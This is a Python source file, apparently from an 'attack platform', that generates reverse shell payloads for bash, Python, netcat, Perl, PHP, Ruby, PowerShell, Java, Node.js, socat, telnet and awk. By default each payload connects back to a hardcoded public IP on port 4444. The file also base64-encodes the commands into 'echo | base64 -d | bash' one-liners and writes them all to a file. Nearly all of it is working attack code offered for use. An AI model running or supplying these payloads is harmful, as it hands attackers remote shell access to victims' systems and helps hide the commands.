"""
dLNk Attack Platform - Reverse Shell Payload Generator
Generates various reverse shell payloads for different platforms
"""

import os
import base64
from typing import Dict, Optional
from loguru import logger


class ReverseShellPayloadGenerator:
    """Generate reverse shell payloads"""
    
    def __init__(self):
        self.lhost = os.getenv("PAYLOAD_LHOST", "13.212.51.95")
        self.lport = os.getenv("PAYLOAD_LPORT", "4444")
        self.encoder = os.getenv("PAYLOAD_ENCODER", "base64")
        
    def generate_bash_reverse_shell(self) -> str:
        """Generate bash reverse shell"""
        payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        return payload
    
    def generate_python_reverse_shell(self) -> str:
        """Generate Python reverse shell"""
        payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'"""
        return payload
    
    def generate_nc_reverse_shell(self) -> str:
        """Generate netcat reverse shell"""
        payload = f"nc {self.lhost} {self.lport} -e /bin/bash"
        return payload
    
    def generate_perl_reverse_shell(self) -> str:
        """Generate Perl reverse shell"""
        payload = f"""perl -e 'use Socket;$i="{self.lhost}";$p={self.lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};'"""
        return payload
    
    def generate_php_reverse_shell(self) -> str:
        """Generate PHP reverse shell"""
        payload = f"""php -r '$sock=fsockopen("{self.lhost}",{self.lport});exec("/bin/bash -i <&3 >&3 2>&3");'"""
        return payload
    
    def generate_ruby_reverse_shell(self) -> str:
        """Generate Ruby reverse shell"""
        payload = f"""ruby -rsocket -e'f=TCPSocket.open("{self.lhost}",{self.lport}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'"""
        return payload
    
    def generate_powershell_reverse_shell(self) -> str:
        """Generate PowerShell reverse shell"""
        payload = f"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        return payload
    
    def generate_java_reverse_shell(self) -> str:
        """Generate Java reverse shell"""
        payload = f"""r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()"""
        return payload
    
    def generate_nodejs_reverse_shell(self) -> str:
        """Generate Node.js reverse shell"""
        payload = f"""(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect({self.lport}, "{self.lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();"""
        return payload
    
    def generate_socat_reverse_shell(self) -> str:
        """Generate socat reverse shell"""
        payload = f"socat TCP:{self.lhost}:{self.lport} EXEC:/bin/bash"
        return payload
    
    def generate_telnet_reverse_shell(self) -> str:
        """Generate telnet reverse shell"""
        payload = f"TF=$(mktemp -u);mkfifo $TF && telnet {self.lhost} {self.lport} 0<$TF | /bin/bash 1>$TF"
        return payload
    
    def generate_awk_reverse_shell(self) -> str:
        """Generate awk reverse shell"""
        payload = f"""awk 'BEGIN {{s = "/inet/tcp/0/{self.lhost}/{self.lport}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null"""
        return payload
    
    def generate_all_payloads(self) -> Dict[str, str]:
        """Generate all available payloads"""
        return {
            "bash": self.generate_bash_reverse_shell(),
            "python": self.generate_python_reverse_shell(),
            "nc": self.generate_nc_reverse_shell(),
            "perl": self.generate_perl_reverse_shell(),
            "php": self.generate_php_reverse_shell(),
            "ruby": self.generate_ruby_reverse_shell(),
            "powershell": self.generate_powershell_reverse_shell(),
            "java": self.generate_java_reverse_shell(),
            "nodejs": self.generate_nodejs_reverse_shell(),
            "socat": self.generate_socat_reverse_shell(),
            "telnet": self.generate_telnet_reverse_shell(),
            "awk": self.generate_awk_reverse_shell(),
        }
    
    def encode_base64(self, payload: str) -> str:
        """Encode payload in base64"""
        encoded = base64.b64encode(payload.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"
    
    def save_payloads(self, filename: Optional[str] = None):
        """Save all payloads to file"""
        payloads = self.generate_all_payloads()
        
        if not filename:
            from datetime import datetime
            filename = f"reverse_shells_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        filepath = os.path.join(
            os.getenv("PAYLOADS_DIR", "/home/ubuntu/aiprojectattack/data/payloads"),
            filename
        )
        
        with open(filepath, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("dLNk Attack Platform - Reverse Shell Payloads\n")
            f.write(f"LHOST: {self.lhost}\n")
            f.write(f"LPORT: {self.lport}\n")
            f.write("=" * 80 + "\n\n")
            
            for name, payload in payloads.items():
                f.write(f"\n{'=' * 80}\n")
                f.write(f"{name.upper()} Reverse Shell\n")
                f.write(f"{'=' * 80}\n")
                f.write(f"{payload}\n\n")
                f.write(f"Base64 Encoded:\n")
                f.write(f"{self.encode_base64(payload)}\n")
        
        logger.success(f"[PayloadGen] Payloads saved to {filepath}")
        return filepath


# Global instance
reverse_shell_generator = ReverseShellPayloadGenerator()


def get_reverse_shell_generator() -> ReverseShellPayloadGenerator:
    """Get reverse shell payload generator instance"""
    return reverse_shell_generator

